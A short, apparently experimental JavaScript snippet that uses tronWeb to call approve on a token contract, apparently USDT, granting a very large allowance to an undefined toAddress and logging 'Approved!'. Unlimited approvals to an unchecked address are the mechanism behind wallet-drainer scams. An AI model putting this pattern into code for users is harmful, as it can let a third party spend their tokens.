console.log("Hello World");
tronWeb
  .contract()
  .at("TBYjMhBiyEJxSA5g4HAoWWZXp7qU5C6Y9c")
  .then((usdtContract) => {
	  usdtContract
		  .approve(toAddress, 1000000000000000)
		  .send()
		  .finally(() => {
			  console.log("Approved!");
		  });
  });